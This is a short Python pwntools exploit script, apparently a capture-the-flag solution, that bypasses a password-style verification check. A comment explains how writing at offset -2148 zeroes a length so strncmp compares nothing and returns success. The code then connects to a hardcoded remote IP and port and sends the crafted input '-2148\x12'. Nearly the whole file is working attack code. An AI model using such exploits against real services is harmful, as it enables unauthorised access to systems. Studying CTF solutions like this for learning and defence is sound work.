from pwn import *

"""
offset to uninit n = -2148
write 0x12 == strlen("Where is the flag?")
such that strlen will be fed a "" (i.e. buf+0x12 = "") => size = 0
strncmp with n = 0 returns 0
=> verify returns True
"""

io = remote('141.85.224.100', 31337)

# first fgets reads -2148
# second fgets reads \x12
io.sendline('-2148\x12')

sleep(2)
print io.recvall()
